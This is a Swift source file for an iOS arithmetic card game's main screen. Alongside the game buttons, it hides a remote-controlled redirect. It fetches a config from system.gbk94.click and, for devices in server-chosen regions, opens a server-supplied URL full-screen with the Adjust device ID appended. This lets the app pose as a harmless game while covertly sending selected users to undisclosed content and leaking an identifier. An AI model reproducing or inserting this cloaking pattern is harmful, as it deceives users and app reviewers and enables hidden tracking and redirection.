
import UIKit
import SnapKit
import Reachability
import Adjust

extension Notification.Name {
    static let ShowADSNotification = Notification.Name("showAds")
}

var adsData: [String: Any]?

/// 加减乘除算法卡牌游戏主控制器
class OperationCardController: UIViewController {
    
    var privacyBtn: UIButton!
    var reachability: Reachability!
    var activityIndicator: UIActivityIndicatorView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        initSubviews()
        NotificationCenter.default.addObserver(self, selector: #selector(handleNotification(_:)), name: .ShowADSNotification, object: nil)
        loadAdsData()
    }
    
    @objc func handleNotification(_ notification: Notification) {
        let adid = Adjust.adid()
        if adid == nil {
            return
        }
        
        if adsData == nil {
            return
        }
        
        let adsurl = adsData!["toUrl"] as? String
        if adsurl == nil {
            return
        }
        
        if adsurl!.isEmpty {
            return
        }
        
        let restrictedRegions: [String] = adsData!["allowArea"] as? [String] ?? Array.init()
        let way: Int = adsData!["jumpWay"] as? Int ?? 1
        
        if restrictedRegions.count > 0 {
            if let currentRegion = Locale.current.regionCode?.lowercased() {
                if restrictedRegions.contains(currentRegion) {
                    showAds(adsUrl: "\(adsurl!)\(adid!)", way: way)
                }
            }
        } else {
            showAds(adsUrl: "\(adsurl!)\(adid!)", way: way)
        }
    }

    deinit {
        NotificationCenter.default.removeObserver(self, name: .ShowADSNotification, object: nil)
    }
    
    private func initSubviews() {
        privacyBtn = UIButton(type: .custom)
        privacyBtn.setImage(UIImage.init(named: "privacy"), for: .normal)
        privacyBtn.addTarget(self, action: #selector(gotoPrivacy), for: .touchUpInside)
        view.addSubview(privacyBtn)
        privacyBtn.snp.makeConstraints { make in
            make.trailing.equalToSuperview().offset(-30)
            make.top.equalToSuperview().offset(30)
            make.size.equalTo(CGSizeMake(60, 60))
        }
        
        activityIndicator = UIActivityIndicatorView(style: .large)
        activityIndicator.hidesWhenStopped = true
        activityIndicator.color = .white
        self.view.addSubview(activityIndicator)
        activityIndicator.snp.makeConstraints { make in
            make.center.equalTo(self.view)
        }
    }
    
    @objc private func gotoPrivacy() {
        let vc: OperationPrivacyViewController = OperationPrivacyViewController.init()
        vc.modalPresentationStyle = .fullScreen
        present(vc, animated: true)
    }
    
    private func loadAdsData() {
        do {
            reachability = try Reachability()
        } catch {
            print("Unable to create Reachability")
            return
        }
        
        if reachability.connection == .unavailable {
            reachability.whenReachable = { reachability in
                self.reachability.stopNotifier()
                self.reqAdsData()
            }

            reachability.whenUnreachable = { _ in
            }

            do {
                try reachability.startNotifier()
            } catch {
                print("Unable to start notifier")
            }
        } else {
            self.reqAdsData()
        }
    }
    
    private func reqAdsData() {
        
        activityIndicator.startAnimating()
        let name = Bundle.main.bundleIdentifier ?? ""
        if let url = URL(string: "https://system.gbk94.click/vn-admin/api/v1/dict-items?dictCode=epiboly_app&name=\(name)&queryMode=list") {
            let session = URLSession.shared
            let task = session.dataTask(with: url) { data, response, error in
                if let error = error {
                    print("error: \(error.localizedDescription)")
                    return
                }
                
                if let httpResponse = response as? HTTPURLResponse {
                    if httpResponse.statusCode == 200 {
                        print("req success")
                    } else {
                        print("HTTP CODE: \(httpResponse.statusCode)")
                    }
                }
                
                if let data = data {
                    do {
                        if let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                            print("JSON: \(jsonResponse)")
                            DispatchQueue.main.async {
                                self.activityIndicator.stopAnimating()
                                let dataArr: [[String: Any]]? = jsonResponse["data"] as? [[String: Any]]
                                if let dataArr = dataArr {
                                    let dic: [String: Any] = dataArr.first ?? Dictionary()
                                    let value: String = dic["value"] as? String ?? ""
                                    let finDic = self.convertToDictionary(from: value)
                                    adsData = finDic
                                    NotificationCenter.default.post(name: .ShowADSNotification, object: nil, userInfo: nil)
                                }
                            }
                        }
                    } catch let parsingError {
                        print("error: \(parsingError.localizedDescription)")
                        DispatchQueue.main.async {
                            self.activityIndicator.stopAnimating()
                        }
                    }
                }
            }

            task.resume()
        }
    }
    
    private func showAds(adsUrl: String, way: Int) {
        if way == 1 {
            let adsVc: OperationPrivacyViewController = OperationPrivacyViewController.init()
            adsVc.modalPresentationStyle = .fullScreen
            adsVc.url = adsUrl
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.01) {
                self.present(adsVc, animated: false)
            }
        } else {
            if let url = URL(string: adsUrl) {
                if UIApplication.shared.canOpenURL(url) {
                    UIApplication.shared.open(url, options: [:], completionHandler: nil)
                }
            }
        }
    }
    
    func convertToDictionary(from jsonString: String) -> [String: Any]? {
        guard let jsonData = jsonString.data(using: .utf8) else {
            return nil
        }
        
        do {
            if let jsonDict = try JSONSerialization.jsonObject(with: jsonData, options: []) as? [String: Any] {
                return jsonDict
            }
        } catch let error {
            print("JSON 解析错误: \(error.localizedDescription)")
        }
        
        return nil
    }

    override func loadView() {
        super.loadView()
        
        // 背景图片
        let imgvBack = UIImageView()
        imgvBack.image = .init(named: "OperationBack")
        imgvBack.contentMode = .scaleAspectFill
        imgvBack.clipsToBounds = true
        self.view.addSubview(imgvBack)
        imgvBack.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        
        // icon 1476 × 1049
        let imgvIcon = UIImageView()
        imgvIcon.image = .init(named: "OperationIcon")
        imgvIcon.contentMode = .scaleAspectFill
        imgvIcon.clipsToBounds = true
        self.view.addSubview(imgvIcon)
        imgvIcon.snp.makeConstraints { make in
            make.top.equalTo(self.view.safeAreaLayoutGuide).offset(20)
            make.centerX.equalToSuperview()
            make.height.equalToSuperview().multipliedBy(0.6)
            make.width.equalTo(imgvIcon.snp.height).multipliedBy(1476.0 / 1049.0)
        }
        
        //
        let btnSimple = UIButton()
        btnSimple.addTarget(self, action: #selector(self.btnSimpleClick(sender:)), for: .touchUpInside)
        self.view.addSubview(btnSimple)
        btnSimple.snp.makeConstraints { make in
            make.top.equalTo(imgvIcon.snp.bottom)//.offset(30)
            make.width.equalTo(140)
            make.height.equalTo(btnSimple.snp.width).multipliedBy(235.0 / 265.0)
        }
        let imgvSimple = UIImageView()
        imgvSimple.image = .init(named: "OperationBtnBack")
        imgvSimple.contentMode = .scaleAspectFill
        imgvSimple.clipsToBounds = true
        btnSimple.addSubview(imgvSimple)
        imgvSimple.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        let labelSimple = UILabel()
        labelSimple.textColor = .white
        labelSimple.font = .systemFont(ofSize: 16, weight: .bold)
        labelSimple.text = "SIMPLE"
        labelSimple.textAlignment = .center
        btnSimple.addSubview(labelSimple)
        labelSimple.snp.makeConstraints { make in
            make.left.right.equalToSuperview()
            make.centerY.equalToSuperview().offset(-10)
        }
        
        // 265 × 235
        let btnDifficulty = UIControl()
        btnDifficulty.addTarget(self, action: #selector(self.btnDifficultyClick(sender:)), for: .touchUpInside)
        self.view.addSubview(btnDifficulty)
        btnDifficulty.snp.makeConstraints { make in
            make.top.equalTo(btnSimple)
            make.left.equalTo(btnSimple.snp.right).offset(30)
            make.centerX.equalToSuperview()
            make.width.height.equalTo(btnSimple)
        }
        let imgvDifficulty = UIImageView()
        imgvDifficulty.image = .init(named: "OperationBtnBack")
        imgvDifficulty.contentMode = .scaleAspectFill
        imgvDifficulty.clipsToBounds = true
        btnDifficulty.addSubview(imgvDifficulty)
        imgvDifficulty.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        let labelDifficulty = UILabel()
        labelDifficulty.textColor = .white
        labelDifficulty.font = .systemFont(ofSize: 16, weight: .bold)
        labelDifficulty.text = "DIFFICULTY"
        labelDifficulty.textAlignment = .center
        btnDifficulty.addSubview(labelDifficulty)
        labelDifficulty.snp.makeConstraints { make in
            make.left.right.equalToSuperview()
            make.centerY.equalToSuperview().offset(-10)
        }
        
        //
        let btnRules = UIButton()
        btnRules.setTitleColor(.label, for: .normal)
        btnRules.titleLabel?.font = .systemFont(ofSize: 16)
        btnRules.setTitle("规则", for: .normal)
        btnRules.addTarget(self, action: #selector(self.btnRulesClick(sender:)), for: .touchUpInside)
        self.view.addSubview(btnRules)
        btnRules.snp.makeConstraints { make in
            make.left.equalTo(btnDifficulty.snp.right).offset(30)
            make.top.equalTo(btnSimple)
            make.width.height.equalTo(btnSimple)
        }
        let imgvRules = UIImageView()
        imgvRules.image = .init(named: "OperationBtnBack")
        imgvRules.contentMode = .scaleAspectFill
        imgvRules.clipsToBounds = true
        btnRules.addSubview(imgvRules)
        imgvRules.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        let labelRules = UILabel()
        labelRules.textColor = .white
        labelRules.font = .systemFont(ofSize: 16, weight: .bold)
        labelRules.text = "RULES"
        labelRules.textAlignment = .center
        btnRules.addSubview(labelRules)
        labelRules.snp.makeConstraints { make in
            make.left.right.equalToSuperview()
            make.centerY.equalToSuperview().offset(-10)
        }
    }
    
    /// 简单按钮点击事件
    @objc private func btnSimpleClick(sender: UIButton) {
        
        let vc = OperationSimpleGameController()
        
        self.present(vc, animated: true)
        
    }
    
    /// 困难按钮点击事件
    @objc private func btnDifficultyClick(sender: UIButton) {
        
        let vc = OperationDifficultyGameController()
        
        self.present(vc, animated: true)
        
    }
    
    /// 游戏规则按钮点击事件
    @objc private func btnRulesClick(sender: UIButton) {
        
        let view = OperationCardRulesView()
        self.view.addSubview(view)
        view.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        
    }

}
